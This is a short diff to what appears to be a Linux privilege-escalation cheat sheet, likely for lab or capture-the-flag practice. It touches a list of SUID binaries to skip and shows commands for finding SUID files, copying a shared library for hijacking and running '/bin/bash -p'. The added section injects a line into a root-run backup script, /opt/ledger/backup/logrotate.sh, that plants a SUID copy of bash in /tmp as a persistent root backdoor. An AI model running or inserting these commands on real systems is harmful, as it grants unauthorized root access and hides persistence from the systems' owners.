@@ -135,7 +135,7 @@ find / -perm -4000 -type f 2>/dev/null | xargs ls -la
 Ignore these:
 
 ```sh
-/usr/bin/su, 
+/usr/bin/su
 /usr/bin/sudo
 /usr/bin/passwd
 /usr/bin/chsh
@@ -383,4 +383,10 @@ cp utils.so /usr/local/lib/dev/
 
 ```sh
 /bin/bash -p
+```
+
+# Drop SUID bit shell
+
+```sh
+echo 'cp /bin/bash /tmp/rbash && chmod u+s /tmp/rbash' >> /opt/ledger/backup/logrotate.sh
 ```
